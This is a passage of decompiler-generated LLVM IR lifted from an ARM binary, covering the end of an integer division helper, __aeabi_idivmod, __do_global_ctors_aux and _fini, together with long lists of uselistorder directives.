  %v2_19cf8 = icmp ugt i32 %v1_19cfc, 15
  br i1 %v2_19cf8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_19cfc = and i32 %v1_19cfc, 8
  %v3_19cfc = icmp eq i32 %v2_19cfc, 0
  %v4_19cfc = udiv i32 %v1_19cfc, 16
  br i1 %v3_19cfc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_19d00 = add nsw i32 %v1_19d00, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_19d08 = phi i32 [ %v1_19d00, %.thread20 ], [ %v1_19d00, %bb109 ], [ %v2_19d00, %bb110 ]
  %v5_19d0c = phi i32 [ %v1_19cfc, %.thread20 ], [ %v4_19cfc, %bb109 ], [ %v4_19cfc, %bb110 ]
  %v2_19d04 = icmp ugt i32 %v5_19d0c, 3
  %v7_19d04 = icmp eq i32 %v5_19d0c, 4
  %v2_19d08 = xor i1 %v7_19d04, true
  %v3_19d08 = and i1 %v2_19d04, %v2_19d08
  br i1 %v3_19d08, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_19d08 = add nsw i32 %v4_19d08, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_19d0c = phi i32 [ %v4_19d08, %.thread21 ], [ %v5_19d08, %bb111 ]
  %v2_19d0c = xor i1 %v2_19d04, true
  %v3_19d0c = or i1 %v7_19d04, %v2_19d0c
  br i1 %v3_19d0c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_19d0c = udiv i32 %v5_19d0c, 2
  %v9_19d0c = add i32 %v4_19d0c, %v8_19d0c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_19d14 = phi i32 [ %v4_19d0c, %bb112 ], [ %v9_19d0c, %bb113 ]
  %v1_19d10 = icmp slt i32 %v2_19c0c, 0
  %v6_19d14 = lshr i32 %v0_19d14, %v1_19d14
  %v2_19d18 = sub i32 0, %v6_19d14
  %v2_19d18.v6_19d14 = select i1 %v1_19d10, i32 %v2_19d18, i32 %v6_19d14
  ret i32 %v2_19d18.v6_19d14

dec_label_pc_19d20:                               ; preds = %entry
  %v0_19d20 = load i32, i32* @lr, align 4
  %v0_19d24 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_19d20)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_19d0c, { 1, 0 }
  uselistorder i1 %v7_19d04, { 1, 0 }
  uselistorder i32 %v4_19cfc, { 1, 0 }
  uselistorder i32 %v1_19cfc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_19cf0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_19cf0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_19ce0, { 1, 0 }
  uselistorder i32 %v0_19ca4, { 1, 0 }
  uselistorder i32 %v4_19c98, { 1, 0 }
  uselistorder i32 %v1_19ca0, { 1, 2, 0 }
  uselistorder i32 %v4_19c8c, { 1, 0 }
  uselistorder i32 %v1_19c94, { 1, 2, 0 }
  uselistorder i32 %v4_19c80, { 1, 0 }
  uselistorder i32 %v1_19c88, { 1, 2, 0 }
  uselistorder i32 %v1_19cac, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_19c7c, { 1, 0 }
  uselistorder i32 %v1_19ca8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_19c68, { 1, 0 }
  uselistorder i32 %v3_19c64, { 1, 0 }
  uselistorder i32 %v1_19c64, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_19c60, { 1, 0 }
  uselistorder i32 %v1_19c68, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19c54, { 1, 0 }
  uselistorder i32 %v4_19c50, { 2, 1, 0 }
  uselistorder i32 %v1_19c54, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_19c5c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_19c28, { 1, 0 }
  uselistorder i32 %v1_19ce0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_19c0c, { 1, 0, 2 }
  uselistorder i32 %v0_19c0c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 47, 49, 50, 51, 54, 55, 56, 3, 57, 58, 59, 60, 61, 44, 45, 46, 18, 19, 20, 21, 62, 69, 70, 71, 72, 73, 74, 75, 84, 23, 22, 0, 24, 25, 1, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 4, 103, 104, 105, 5, 106, 107, 108, 6, 109, 110, 111, 112, 113, 114, 115, 116, 65, 26, 27, 28, 7, 30, 31, 29, 85, 86, 87, 117, 48, 79, 118, 119, 120, 12, 13, 14, 15, 88, 89, 90, 121, 52, 53, 81, 82, 32, 33, 76, 77, 78, 83, 63, 16, 66, 67, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 2, 17, 64, 10, 11, 68, 80, 91, 92, 8, 9 }
  uselistorder i32 3, { 78, 49, 26, 27, 80, 21, 81, 82, 22, 83, 84, 13, 65, 0, 29, 28, 50, 3, 2, 1, 4, 85, 30, 5, 6, 14, 7, 8, 51, 52, 93, 53, 54, 55, 56, 57, 58, 66, 11, 31, 67, 32, 69, 33, 70, 34, 71, 35, 72, 36, 73, 12, 63, 94, 17, 64, 90, 91, 23, 89, 15, 86, 16, 68, 9, 10, 59, 24, 60, 25, 92, 61, 19, 37, 74, 75, 20, 76, 38, 77, 62, 41, 40, 39, 48, 79, 42, 87, 88, 43, 44, 45, 46, 47, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 8, 0, 4, 6, 7 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 148, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 145, 63, 146, 64, 147, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 141, 1, 77, 78, 81, 80, 79, 84, 83, 82, 85, 86, 87, 88, 89, 90, 149, 91, 92, 93, 140, 98, 94, 95, 99, 96, 97, 100, 101, 106, 102, 103, 105, 104, 107, 109, 108, 142, 110, 143, 112, 111, 113, 114, 115, 118, 116, 117, 119, 120, 121, 123, 122, 124, 125, 126, 129, 127, 128, 130, 131, 133, 132, 134, 135, 136, 137, 138, 139, 144 }
  uselistorder i32 128, { 12, 6, 7, 10, 5, 19, 0, 21, 22, 1, 20, 8, 15, 16, 2, 3, 11, 17, 18, 4, 14, 9, 13 }
  uselistorder i32 255, { 9, 12, 1, 11, 0, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 77, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 71, 69, 72, 74, 75, 73, 76, 78 }
  uselistorder i32 32768, { 2, 1, 0, 4, 3 }
  uselistorder i32 65535, { 2, 1, 3, 0 }
  uselistorder i32 31, { 15, 10, 4, 12, 2, 1, 0, 5, 7, 6, 8, 3, 13, 14, 11, 9, 16 }
  uselistorder i32 4, {}
  uselistorder i32 2, { 2, 126, 3, 4, 5, 6, 7, 45, 8, 160, 68, 69, 162, 117, 118, 161, 70, 163, 164, 165, 166, 167, 44, 85, 132, 9, 134, 133, 168, 169, 170, 10, 46, 47, 48, 49, 50, 51, 136, 137, 119, 120, 121, 11, 122, 52, 188, 189, 74, 190, 191, 55, 192, 54, 193, 53, 173, 138, 43, 139, 140, 12, 141, 142, 86, 87, 149, 88, 150, 89, 151, 13, 56, 14, 123, 90, 152, 91, 153, 92, 154, 93, 155, 94, 156, 71, 135, 42, 15, 194, 72, 175, 16, 95, 176, 177, 17, 96, 178, 179, 82, 127, 0, 18, 19, 20, 97, 57, 59, 58, 60, 61, 62, 63, 76, 64, 77, 65, 66, 171, 172, 143, 144, 83, 21, 22, 23, 124, 24, 84, 145, 78, 75, 25, 146, 147, 148, 174, 26, 125, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 128, 36, 37, 38, 39, 40, 98, 73, 99, 100, 101, 79, 157, 158, 102, 80, 103, 107, 129, 106, 130, 105, 104, 131, 116, 108, 159, 109, 110, 180, 181, 182, 183, 111, 184, 112, 113, 114, 187, 81, 185, 41, 186, 67, 115 }
  uselistorder i32 16, { 3, 24, 4, 5, 1, 6, 7, 92, 93, 94, 0, 95, 96, 8, 9, 97, 98, 10, 99, 100, 101, 102, 67, 68, 112, 113, 32, 33, 34, 120, 35, 121, 122, 36, 123, 124, 37, 125, 126, 127, 128, 129, 130, 103, 107, 108, 69, 70, 38, 71, 72, 73, 74, 75, 76, 77, 78, 104, 39, 79, 29, 62, 40, 59, 90, 60, 114, 115, 131, 27, 109, 110, 80, 81, 82, 83, 84, 85, 55, 105, 106, 61, 11, 111, 26, 12, 13, 14, 15, 16, 17, 25, 18, 19, 2, 20, 21, 30, 44, 45, 63, 64, 65, 66, 46, 41, 42, 47, 86, 87, 48, 43, 49, 88, 89, 56, 57, 50, 58, 91, 28, 31, 51, 116, 117, 22, 118, 52, 119, 23, 53, 54 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 8, { 51, 24, 3, 4, 14, 5, 109, 110, 111, 112, 0, 1, 113, 114, 115, 116, 117, 6, 118, 58, 44, 45, 52, 119, 120, 121, 122, 20, 123, 73, 142, 153, 36, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 37, 124, 74, 75, 76, 77, 78, 79, 80, 81, 82, 22, 83, 53, 84, 85, 86, 125, 126, 127, 170, 25, 59, 7, 108, 139, 60, 61, 35, 146, 145, 143, 144, 63, 64, 65, 147, 148, 149, 150, 151, 152, 8, 136, 137, 2, 169, 40, 41, 38, 39, 16, 17, 28, 29, 42, 171, 87, 128, 129, 88, 89, 54, 90, 91, 92, 93, 21, 94, 48, 49, 95, 96, 97, 43, 98, 99, 100, 101, 27, 18, 19, 102, 103, 50, 130, 131, 62, 132, 133, 23, 134, 135, 9, 10, 55, 26, 11, 12, 15, 13, 66, 67, 68, 69, 70, 71, 46, 72, 104, 105, 47, 106, 107, 34, 33, 32, 56, 57, 31, 30, 138, 140, 141 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 45, 48, 3, 4, 6, 5, 7, 51, 49, 8, 9, 10, 11, 12, 13, 50, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 26, 27, 30, 31, 44, 52, 32, 33, 34, 46, 35, 36, 37, 38, 47, 39, 40, 41, 42, 43 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_19cb4, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_19c70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19c5cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_19d34 = sdiv i32 %arg1, %arg2
  ret i32 %v2_19d34
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19d4c = load i32, i32* @global_var_2c304.1228, align 4
  %v7_19d50 = icmp eq i32 %v3_19d4c, -1
  %v3_19d54 = load i32, i32* @r4, align 4
  store i32 %v3_19d54, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2c304.1228 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_19d50, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_19d54, i32* %r4.global-to-local, align 4
  %v9_19d5c = load i32, i32* @r0, align 4
  ret i32 %v9_19d5c

.preheader:                                       ; preds = %entry, %.preheader
  %v0_19d64 = phi i32 [ %v3_19d68, %.preheader ], [ %v3_19d4c, %entry ]
  call void @__pseudo_branch(i32 %v0_19d64)
  %v0_19d68 = load i32, i32* %r4.global-to-local, align 4
  %v1_19d68 = add i32 %v0_19d68, -4
  %v2_19d68 = inttoptr i32 %v1_19d68 to i32*
  %v3_19d68 = load i32, i32* %v2_19d68, align 4
  store i32 %v1_19d68, i32* %r4.global-to-local, align 4
  %v3_19d6c = icmp eq i32 %v3_19d68, -1
  br i1 %v3_19d6c, label %dec_label_pc_19d74, label %.preheader

dec_label_pc_19d74:                               ; preds = %.preheader
  %v2_19d74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19d74, i32* %r4.global-to-local, align 4
  %v8_19d74 = load i32, i32* @r0, align 4
  ret i32 %v8_19d74

; uselistorder directives
  uselistorder i32 %v3_19d68, { 1, 0 }
  uselistorder i32 %v3_19d4c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 16, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 17, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, {}
  uselistorder i32* @global_var_2c304.1228, { 1, 0 }
  uselistorder i32 1, { 539, 113, 994, 361, 995, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 540, 288, 289, 287, 284, 283, 285, 286, 1008, 458, 1009, 1010, 541, 71, 70, 72, 69, 75, 73, 74, 1011, 178, 1012, 401, 1013, 1018, 1019, 437, 1020, 1021, 1022, 459, 460, 1023, 1024, 542, 290, 291, 295, 292, 294, 293, 543, 1025, 544, 67, 66, 65, 68, 1026, 545, 98, 99, 1027, 1028, 1029, 1030, 546, 159, 160, 861, 862, 863, 864, 865, 866, 867, 868, 869, 549, 548, 547, 154, 155, 156, 870, 871, 872, 873, 874, 553, 552, 551, 550, 104, 103, 109, 105, 108, 107, 106, 110, 111, 102, 112, 402, 1031, 1032, 403, 1033, 1034, 1035, 1036, 1037, 461, 1038, 1039, 1040, 1041, 1042, 555, 554, 264, 262, 266, 263, 267, 268, 269, 261, 265, 378, 1047, 1043, 1044, 1045, 1046, 423, 556, 131, 132, 130, 1048, 557, 972, 973, 974, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 558, 58, 59, 52, 53, 54, 55, 57, 56, 386, 32, 1064, 1065, 1066, 1067, 1068, 1069, 559, 297, 298, 299, 296, 560, 123, 387, 462, 902, 561, 79, 77, 76, 80, 78, 1070, 1071, 463, 562, 127, 128, 125, 129, 124, 126, 903, 904, 564, 563, 301, 303, 302, 300, 304, 565, 15, 1078, 404, 1077, 388, 366, 1080, 405, 1079, 0, 1083, 1084, 1085, 1086, 568, 567, 566, 157, 158, 1125, 1126, 1127, 1128, 1129, 438, 1130, 1131, 439, 1133, 464, 1134, 431, 432, 442, 1, 440, 441, 1135, 1132, 465, 1136, 427, 575, 574, 526, 573, 572, 527, 571, 570, 569, 379, 426, 1205, 1206, 1207, 1208, 1209, 406, 576, 64, 975, 976, 977, 577, 307, 308, 306, 305, 905, 389, 906, 1248, 390, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 528, 579, 578, 247, 248, 249, 251, 246, 245, 244, 250, 253, 252, 466, 1087, 1088, 1103, 1104, 1105, 1106, 580, 529, 255, 254, 256, 391, 407, 907, 467, 908, 909, 468, 375, 408, 372, 433, 434, 910, 469, 911, 912, 913, 914, 409, 915, 362, 916, 917, 470, 918, 919, 593, 592, 591, 590, 589, 588, 587, 586, 585, 584, 583, 582, 581, 530, 166, 168, 171, 177, 167, 164, 165, 172, 170, 169, 163, 161, 162, 176, 173, 175, 174, 1181, 1182, 531, 594, 135, 133, 138, 140, 136, 137, 134, 139, 920, 921, 922, 923, 373, 924, 925, 926, 595, 83, 84, 81, 85, 82, 927, 928, 596, 114, 1089, 1090, 1091, 1092, 1093, 38, 37, 35, 36, 34, 33, 39, 40, 929, 598, 597, 92, 93, 95, 94, 410, 443, 601, 600, 599, 602, 309, 603, 100, 101, 604, 91, 605, 310, 606, 222, 607, 311, 608, 312, 609, 313, 610, 257, 611, 2, 615, 614, 613, 612, 17, 16, 471, 616, 411, 472, 617, 187, 618, 619, 965, 624, 623, 622, 621, 620, 232, 233, 236, 235, 234, 1221, 1222, 627, 626, 625, 242, 628, 380, 896, 897, 374, 898, 629, 315, 319, 314, 316, 318, 320, 317, 899, 412, 473, 474, 475, 476, 966, 630, 198, 381, 875, 631, 118, 120, 121, 119, 122, 116, 115, 996, 365, 413, 997, 633, 632, 210, 211, 214, 212, 213, 634, 219, 215, 221, 217, 216, 218, 220, 635, 277, 279, 278, 281, 280, 282, 636, 637, 638, 640, 639, 1261, 414, 643, 642, 641, 322, 321, 644, 180, 181, 179, 182, 60, 61, 62, 63, 645, 196, 197, 195, 194, 646, 647, 354, 353, 415, 1225, 648, 237, 238, 477, 478, 376, 652, 651, 650, 649, 191, 392, 653, 323, 654, 200, 655, 117, 656, 231, 657, 51, 658, 324, 659, 225, 660, 23, 479, 1137, 377, 1138, 1139, 480, 1158, 664, 663, 662, 661, 24, 26, 27, 25, 665, 666, 1183, 1184, 325, 668, 667, 327, 328, 326, 1262, 669, 1172, 1173, 1174, 1175, 3, 1014, 1015, 1016, 1017, 930, 931, 670, 329, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 393, 932, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 228, 226, 227, 229, 230, 1201, 367, 31, 30, 29, 394, 1202, 967, 968, 969, 970, 22, 21, 1082, 1081, 849, 850, 851, 852, 853, 854, 855, 1266, 10, 11, 8, 9, 933, 50, 49, 481, 671, 1110, 1107, 1108, 1109, 368, 395, 87, 88, 86, 90, 89, 1094, 1098, 1099, 1100, 1101, 1102, 672, 203, 201, 205, 202, 206, 204, 416, 1095, 1096, 482, 1097, 674, 673, 273, 274, 275, 676, 675, 259, 678, 677, 271, 270, 878, 680, 679, 208, 207, 428, 934, 484, 935, 936, 417, 418, 937, 938, 485, 939, 941, 942, 943, 486, 945, 419, 946, 944, 483, 947, 487, 948, 429, 949, 950, 940, 684, 683, 682, 681, 141, 148, 144, 149, 143, 142, 150, 151, 145, 146, 147, 951, 685, 330, 335, 331, 333, 334, 332, 686, 190, 189, 952, 953, 954, 687, 152, 153, 430, 382, 956, 383, 957, 420, 958, 959, 961, 369, 962, 488, 963, 384, 960, 421, 695, 694, 693, 692, 691, 690, 689, 688, 44, 47, 48, 46, 45, 489, 396, 696, 41, 42, 43, 955, 444, 532, 697, 698, 336, 490, 876, 877, 699, 338, 337, 339, 1263, 445, 1264, 1265, 700, 341, 340, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 491, 1120, 1121, 1122, 1123, 397, 1124, 703, 702, 701, 344, 343, 342, 346, 345, 705, 704, 706, 1072, 1073, 1074, 1075, 1076, 709, 708, 707, 19, 20, 1210, 710, 18, 711, 12, 712, 13, 14, 713, 347, 714, 199, 715, 260, 716, 348, 717, 186, 188, 718, 349, 209, 719, 192, 720, 355, 721, 722, 723, 350, 724, 351, 725, 276, 726, 352, 360, 272, 446, 1161, 1162, 447, 1226, 1227, 363, 1228, 879, 370, 385, 880, 881, 882, 364, 494, 883, 884, 885, 886, 887, 888, 889, 890, 492, 493, 435, 495, 891, 733, 732, 731, 730, 729, 728, 727, 892, 893, 740, 739, 738, 737, 736, 533, 735, 734, 894, 895, 742, 741, 496, 900, 901, 497, 498, 499, 744, 743, 500, 745, 501, 964, 750, 749, 748, 747, 746, 752, 751, 971, 538, 978, 979, 980, 981, 982, 983, 502, 757, 756, 755, 754, 753, 185, 184, 984, 985, 986, 987, 988, 503, 989, 990, 991, 992, 764, 763, 762, 761, 760, 759, 758, 224, 223, 993, 770, 769, 768, 767, 766, 765, 998, 856, 857, 505, 858, 504, 859, 860, 848, 999, 1000, 779, 778, 777, 776, 775, 774, 773, 772, 771, 241, 240, 239, 506, 507, 783, 782, 781, 780, 450, 1159, 784, 96, 97, 786, 785, 4, 508, 1160, 424, 788, 787, 1163, 790, 789, 448, 1164, 509, 510, 1166, 1165, 511, 793, 792, 791, 451, 1167, 1168, 512, 513, 514, 1176, 534, 1169, 515, 794, 449, 516, 1170, 517, 1171, 800, 799, 798, 797, 796, 795, 452, 1177, 1178, 453, 801, 802, 1179, 518, 1180, 805, 804, 803, 807, 806, 422, 1185, 1186, 1187, 519, 371, 1188, 1189, 1190, 520, 1191, 811, 810, 809, 808, 535, 1192, 812, 183, 1193, 813, 521, 1203, 816, 815, 814, 1204, 536, 28, 455, 1211, 1212, 454, 1213, 1214, 456, 457, 1215, 1216, 817, 1217, 5, 6, 1220, 1218, 1219, 522, 821, 820, 819, 818, 1223, 1224, 823, 822, 827, 826, 825, 824, 830, 829, 828, 832, 831, 1229, 1230, 523, 1240, 1241, 425, 1242, 835, 834, 833, 436, 7, 839, 838, 837, 836, 399, 1231, 1232, 1233, 398, 1234, 1238, 1239, 524, 841, 840, 525, 1235, 1236, 1237, 843, 842, 243, 1243, 1244, 844, 537, 258, 400, 1245, 1246, 845, 356, 1247, 193, 846, 847, 359, 358, 357 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_19d80 = load i32, i32* @r0, align 4
  ret i32 %v5_19d80

; uselistorder directives
  uselistorder i32* @r0, { 8, 9, 10, 179, 11, 186, 187, 188, 189, 192, 190, 191, 12, 56, 57, 193, 194, 7, 195, 196, 140, 141, 142, 197, 198, 205, 219, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 172, 173, 174, 175, 14, 15, 217, 17, 143, 18, 144, 145, 146, 19, 284, 285, 286, 46, 276, 287, 288, 52, 53, 54, 55, 20, 21, 22, 23, 168, 169, 49, 289, 290, 82, 170, 32, 180, 181, 182, 183, 184, 185, 58, 59, 60, 61, 62, 264, 265, 292, 24, 25, 279, 26, 278, 66, 50, 67, 33, 280, 291, 171, 27, 252, 253, 254, 255, 256, 257, 258, 259, 13, 269, 41, 147, 148, 149, 16, 211, 212, 213, 214, 215, 216, 28, 206, 207, 208, 209, 68, 218, 69, 150, 151, 152, 3, 29, 153, 154, 4, 6, 0, 1, 155, 156, 5, 157, 158, 159, 30, 160, 161, 162, 2, 163, 138, 210, 63, 64, 65, 294, 295, 220, 221, 222, 223, 224, 225, 226, 227, 164, 165, 199, 200, 201, 202, 203, 204, 31, 40, 70, 293, 34, 47, 48, 35, 266, 36, 282, 37, 283, 39, 38, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 166, 167, 176, 177, 178, 260, 261, 262, 263, 267, 268, 270, 271, 272, 273, 274, 275, 277, 281, 42, 43, 44, 45, 51 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_19d88 = load i32, i32* @r4, align 4
  %v0_19d90 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_19d88)
  ret i32 %v0_19d90

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 14, 8, 6, 7, 19, 20, 16, 17, 18, 0, 21, 9, 3, 10, 4, 5, 11, 12, 13, 2, 15 }
  uselistorder i32 0, { 0, 1944, 1945, 1946, 1947, 110, 1948, 165, 1949, 1950, 1951, 1952, 1953, 1954, 1955, 166, 1491, 1494, 1492, 1493, 1956, 1957, 1958, 1959, 1960, 1961, 1972, 47, 89, 1973, 1974, 1975, 1976, 1977, 1978, 1987, 1988, 1979, 1980, 1981, 1982, 1983, 1984, 1985, 1986, 1989, 1495, 1675, 1676, 2001, 351, 352, 1992, 1993, 167, 1994, 1995, 1997, 1996, 1998, 1999, 287, 2000, 161, 162, 163, 2002, 1990, 1991, 78, 79, 2003, 2005, 2006, 2004, 2007, 2008, 2009, 2010, 102, 2011, 2012, 103, 2013, 104, 2014, 105, 2015, 170, 1537, 168, 1538, 1539, 1540, 169, 1541, 90, 91, 1542, 171, 1543, 353, 31, 354, 1544, 1545, 288, 172, 355, 356, 1546, 173, 2016, 2017, 2018, 2020, 174, 2019, 238, 357, 2021, 358, 48, 49, 50, 51, 126, 127, 175, 176, 2022, 128, 2023, 295, 294, 293, 1, 98, 52, 1898, 2024, 2025, 1899, 291, 1677, 177, 2026, 2027, 2028, 2029, 2030, 1678, 1679, 32, 1680, 1681, 129, 1682, 1683, 2031, 2032, 2033, 2, 2034, 2035, 1684, 178, 1685, 1686, 1687, 1688, 1689, 1690, 2036, 179, 296, 2037, 2044, 2045, 359, 2046, 2047, 2048, 2049, 2050, 2051, 2052, 2053, 53, 2055, 2054, 92, 2078, 2079, 360, 2113, 2099, 2100, 2101, 4, 3, 300, 285, 286, 292, 2102, 2103, 2105, 2106, 130, 233, 2108, 361, 2109, 2110, 5, 2111, 2112, 2114, 362, 301, 2107, 2104, 2115, 2116, 180, 2117, 2118, 6, 2194, 2195, 2196, 2197, 182, 181, 2198, 183, 1900, 1901, 7, 1496, 1691, 54, 131, 1692, 1693, 239, 8, 1497, 241, 1694, 55, 132, 1695, 1696, 240, 2275, 2276, 2277, 2278, 2281, 2282, 2283, 2284, 2285, 2286, 2287, 2288, 2279, 2280, 2289, 2290, 2291, 2292, 2293, 2294, 2295, 2296, 33, 2297, 2298, 2299, 2300, 34, 2301, 2302, 35, 2303, 2304, 36, 2305, 2306, 2307, 2308, 2309, 2310, 2311, 2312, 2313, 2314, 2315, 2316, 2317, 2318, 2321, 2322, 2323, 2324, 2325, 2326, 2327, 2328, 2319, 2320, 2329, 2330, 2331, 2332, 2333, 2334, 2335, 2336, 37, 2337, 2338, 2339, 2340, 38, 2341, 2342, 2343, 2344, 39, 2345, 2346, 2347, 2348, 2349, 2350, 2351, 2352, 2353, 2354, 2355, 2356, 2056, 2057, 2071, 363, 364, 2072, 2073, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 184, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 40, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 133, 101, 1735, 1736, 185, 186, 1737, 1738, 1739, 1740, 187, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 41, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 289, 1757, 56, 188, 1758, 189, 365, 1759, 1760, 1761, 1762, 1763, 1764, 42, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 366, 1772, 1773, 1774, 1775, 190, 1776, 1777, 1778, 43, 1779, 123, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 2170, 9, 2171, 2172, 2173, 1498, 2174, 2175, 2176, 2177, 2178, 2179, 1788, 1787, 1789, 1790, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 134, 2058, 2059, 10, 2060, 242, 1804, 243, 1805, 1806, 135, 1807, 2207, 2223, 2224, 2225, 2226, 1924, 2357, 2358, 2359, 2360, 2210, 2361, 2211, 2362, 2363, 191, 2364, 108, 2365, 106, 107, 2366, 2367, 2368, 367, 368, 369, 2372, 370, 2383, 2388, 1499, 244, 2389, 371, 2387, 372, 373, 11, 2369, 2370, 374, 192, 1882, 302, 1883, 377, 304, 303, 1884, 1885, 1886, 1887, 376, 1888, 1889, 375, 1890, 2212, 193, 2371, 1604, 1605, 1606, 1607, 1608, 1609, 195, 136, 1610, 1611, 1612, 109, 194, 1613, 196, 1891, 1892, 378, 1897, 379, 1547, 137, 1548, 138, 1549, 197, 1962, 1963, 1964, 1965, 